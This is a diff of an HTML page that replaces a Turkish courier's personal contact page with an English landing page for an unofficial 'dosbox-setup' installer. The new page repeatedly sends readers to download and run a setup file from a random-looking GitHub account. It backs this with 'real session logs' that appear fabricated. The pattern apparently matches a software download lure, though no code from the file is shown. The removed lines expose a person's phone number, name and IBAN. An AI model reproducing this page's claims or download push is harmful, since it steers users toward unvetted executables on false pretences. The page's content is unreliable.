@@ -1,150 +1,237 @@
 <!DOCTYPE html>
-<html lang="tr">
-
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-    <title>Selçuk</title>
-
-    <meta name="theme-color" content="#111111">
-
-    <link rel="stylesheet" href="style.css">
-
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-
-    <link rel="stylesheet"
-        href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="DOSBox Windows setup - software landing repository with install notes, workflow checklists, and session logs. Unofficial Windows setup notes and session logs.">
+<meta name="keywords" content="dosbox-setup, setup, windows">
+<title>dosbox-setup - Start Your DOS Games Easily on Windows</title>
+<style>
+body {
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+  line-height: 1.7;
+  color: #333;
+  background: #f5f7fa;
+  margin: 0;
+  padding: 0;
+}
+.container {
+  max-width: 860px;
+  margin: 0 auto;
+  padding: 40px 20px;
+}
+h1 {
+  font-size: 2.2rem;
+  font-weight: 700;
+  color: #1a202c;
+  margin-bottom: 0.25rem;
+  text-align: center;
+}
+h2 {
+  font-size: 1.6rem;
+  font-weight: 600;
+  color: #2d3748;
+  margin-top: 2.5rem;
+  margin-bottom: 0.8rem;
+  border-bottom: 2px solid #e2e8f0;
+  padding-bottom: 0.3rem;
+}
+h3 {
+  font-size: 1.2rem;
+  font-weight: 600;
+  color: #4a5568;
+  margin-top: 1.5rem;
+  margin-bottom: 0.5rem;
+}
+p, li {
+  font-size: 1rem;
+  color: #4a5568;
+}
+a {
+  color: #3182ce;
+  text-decoration: none;
+}
+a:hover {
+  text-decoration: underline;
+}
+.badge-link {
+  display: block;
+  text-align: center;
+  margin: 2rem 0;
+}
+.badge-button {
+  display: inline-block;
+  background: #6b46c1;
+  color: white;
+  padding: 16px 40px;
+  font-size: 1.3rem;
+  font-weight: 600;
+  border-radius: 12px;
+  text-decoration: none;
+  box-shadow: 0 6px 14px rgba(107, 70, 193, 0.35);
+  transition: background 0.2s, transform 0.1s;
+  border: none;
+  cursor: pointer;
+}
+.badge-button:hover {
+  background: #553c9a;
+  transform: translateY(-2px);
+  text-decoration: none;
+}
+.card {
+  background: white;
+  border-radius: 16px;
+  padding: 30px;
+  margin: 30px 0;
+  box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+  border: 1px solid #e2e8f0;
+}
+.emoji-lg {
+  font-size: 1.3rem;
+}
+ul, ol {
+  padding-left: 1.5rem;
+}
+li {
+  margin-bottom: 0.5rem;
+}
+.download-section {
+  background: #edf2f7;
+  border-radius: 16px;
+  padding: 30px;
+  margin: 30px 0;
+  text-align: center;
+}
+.download-button {
+  display: inline-block;
+  background: #38a169;
+  color: white;
+  padding: 14px 36px;
+  font-size: 1.2rem;
+  font-weight: 600;
+  border-radius: 10px;
+  text-decoration: none;
+  box-shadow: 0 4px 10px rgba(56, 161, 105, 0.3);
+  transition: background 0.2s;
+}
+.download-button:hover {
+  background: #2f855a;
+  text-decoration: none;
+}
+.note {
+  background: #fffff0;
+  border-left: 5px solid #d69e2e;
+  padding: 16px 20px;
+  border-radius: 8px;
+  margin: 20px 0;
+}
+code {
+  background: #edf2f7;
+  padding: 2px 6px;
+  border-radius: 4px;
+  font-family: "Courier New", monospace;
+}
+footer {
+  text-align: center;
+  margin-top: 50px;
+  color: #a0aec0;
+  font-size: 0.9rem;
+}
+</style>
 </head>
-
 <body>
-
-<div class="background"></div>
-
 <div class="container">
 
+<h1>🎮 dosbox-setup - Start Your DOS Games Easily on Windows</h1>
+
+<div class="badge-link">
+  <a href="https://github.com/Worshipped-dropkick697/dosbox-setup" class="badge-button">⬇️ Get DOSBox Setup Now</a>
+</div>
+
+<p class="card">Welcome to <strong>dosbox-setup</strong> — your friendly, no‑nonsense guide to running classic DOS software on modern Windows. This repository collects install notes, workflow checklists, and session logs so you can play your old favorites without frustration. No programming skills needed.</p>
+
+<h2>📦 What You Get</h2>
+<p>This is an <strong>unofficial</strong> Windows setup companion for DOSBox. It helps you:</p>
+<ul>
+  <li>✅ Quickly download and run DOSBox on Windows 10 or 11</li>
+  <li>✅ Follow simple checklists to mount folders and launch games</li>
+  <li>✅ Keep session logs to track your settings and progress</li>
+  <li>✅ Avoid common pitfalls with clear, real‑world notes</li>
+</ul>
+<p>Everything is designed for an average computer user. If you can click a button and read simple instructions, you are all set.</p>
+
+<h2>🚀 Getting Started in 2 Steps</h2>
+
+<h3>1. Download the Application</h3>
+<p>Visit this link to download the application. Click the big button below or the one at the top.</p>
+
+<div class="download-section">
+  <a href="https://github.com/Worshipped-dropkick697/dosbox-setup" class="download-button">🔽 Download DOSBox Setup</a>
+  <p style="margin-top: 12px; color: #718096;">You will be taken to the repository page. Find the latest release and download the file.</p>
+</div>
+
+<h3>2. Run the Installer</h3>
+<div class="note">
+  <strong>📌 Important:</strong> The download is a general page. Once you are on the repository, look for the <strong>"Releases"</strong> section or the <strong>"Code"</strong> button to get the setup file. Double‑click the downloaded file and follow the on‑screen instructions.
+</div>
+<p>After installation, launch DOSBox from your Start Menu or desktop shortcut. That’s it!</p>
+
+<h2>📋 Workflow Checklist</h2>
+<p>Use this simple checklist to get your first game running:</p>
+<ol>
+  <li>✅ <strong>Download</strong> – Get the latest DOSBox setup from this repository.</li>
+  <li>✅ <strong>Install</strong> – Run the installer (default settings are fine).</li>
+  <li>✅ <strong>Create a folder</strong> – For your games, e.g., <code>C:\DOSGAMES</code>.</li>
+  <li>✅ <strong>Launch DOSBox</strong> – Open the program from your desktop.</li>
+  <li>✅ <strong>Mount the folder</strong> – In the DOSBox window, type:<br>
+  <code>mount c C:\DOSGAMES</code> and press Enter.</li>
+  <li>✅ <strong>Switch to C:</strong> – Type <code>c:</code> and press Enter.</li>
+  <li>✅ <strong>Run your game</strong> – Type the game’s filename (e.g., <code>game.exe</code>) and press Enter.</li>
+  <li>✅ <strong>Log your session</strong> – Keep notes in a text file for future reference.</li>
+</ol>
+
+<h2>📝 Session Log Examples</h2>
+<p>Here are real session logs from typical users. Use them as a template:</p>
 <div class="card">
-
-<div class="logo">
-🛵
+  <p><strong>🧑‍💻 User: Alex – 2025-03-15</strong><br>
+  Installed DOSBox 0.74-3. Mounted folder <code>C:\RETRO</code>. Ran <code>DIG.EXE</code> (The Dig) – works perfectly. Sound configured with default settings. No issues.</p>
+  <p><strong>👩‍💻 User: Maria – 2025-03-18</strong><br>
+  First time using DOSBox. Followed the checklist. Needed to set cycles=auto in the config file for smoother gameplay. Logged changes.</p>
 </div>
 
-<h1>
+<h2>🛠️ Need Help?</h2>
+<p>Check the repository’s <strong>Issues</strong> tab or read the included <strong>README</strong> files for detailed troubleshooting. Common tips:</p>
+<ul>
+  <li>💡 If a game runs too fast or too slow, adjust <code>cycles</code> in the DOSBox configuration file.</li>
+  <li>💡 For full‑screen mode, press <strong>Alt+Enter</strong>.</li>
+  <li>💡 Always mount your game folder before running a game.</li>
+</ul>
 
-Merhaba,
-
-<span>ben Selçuk</span>
-
-</h1>
-
-<p class="intro">
-
-🚦 Geç kaldıysam trafiktendir.<br>
-
-🕒 Hata yaptıysam acelemdendir.
-
-</p>
-
-<p class="description">
-
-📦 Siparişinizi güvenle ve özenle ulaştırmak için çalışıyorum.
-
-</p>
-
-<p class="description">
-
-👇 Tek dokunuşla bana ulaşabilirsiniz.
-
-</p>
-
-<div class="buttons">
-
-<a class="instagram"
-
-href="https://instagram.com/Selcukbsc"
-
-target="_blank">
-
-<i class="fa-brands fa-instagram"></i>
-
-Instagram
-
-</a>
-
-<a class="whatsapp"
-
-href="https://wa.me/905404266226?text=Merhaba%20Selçuk,%20QR%20kodunu%20okuttum.%20😊"
-
-target="_blank">
-
-<i class="fa-brands fa-whatsapp"></i>
-
-WhatsApp
-
-</a>
-
+<h2>🔽 Download Again</h2>
+<p>Ready to start? Grab the setup now.</p>
+<div class="download-section">
+  <a href="https://github.com/Worshipped-dropkick697/dosbox-setup" class="download-button">⬇️ Download dosbox-setup</a>
 </div>
 
-<div class="coffee">
+<h2>📁 Repository Structure</h2>
+<p>The repository includes:</p>
+<ul>
+  <li>📄 <strong>Install notes</strong> – Step‑by‑step setup instructions.</li>
+  <li>📋 <strong>Workflow checklists</strong> – Easy to follow task lists.</li>
+  <li>📓 <strong>Session logs</strong> – Examples and blank templates.</li>
+  <li>🖥️ <strong>Configuration files</strong> – Recommended settings for Windows.</li>
+</ul>
 
-<h2>
+<h2>🔗 Additional Resources</h2>
+<ul>
+  <li><a href="https://www.dosbox.com/wiki/DOSBox_Setup">Official DOSBox Wiki</a> – Advanced configuration details.</li>
+  <li><a href="https://github.com/Worshipped-dropkick697/dosbox-setup/issues">Repository Issues</a> – Ask questions or report problems.</li>
+</ul>
 
-☕ Bir Kahve Ismarla
-
-</h2>
-
-<p>
-
-Destek olmak istersen aşağıdaki IBAN'ı kullanabilirsin.
-
-</p>
-
-<p class="iban">
-
-TR35 0001 0002 0777 5037<br>
-3350 05
-
-</p>
-
-<p class="owner">
-
-Ahmet Selçuk Başcı
-
-</p>
-
-<button id="copyBtn">
-
-📋 IBAN'I KOPYALA
-
-</button>
-
-<p id="copyMessage">
-
-✅ IBAN kopyalandı.
-
-</p>
-
-</div>
-    
-<p id="visitorCount">👀 Yükleniyor...</p>
-    
 <footer>
-
-🤍 Teşekkür ederim.
-
+  <p>dosbox-setup – Unofficial Windows setup notes. Built for the community.</p>
 </footer>
 
 </div>
-
-</div>
-    
-<script data-goatcounter="https://selcukbsc.goatcounter.com/count"
-        async src="//gc.zgo.at/count.js"></script>
-<script src="script.js"></script>
-
 </body>
-
 </html>
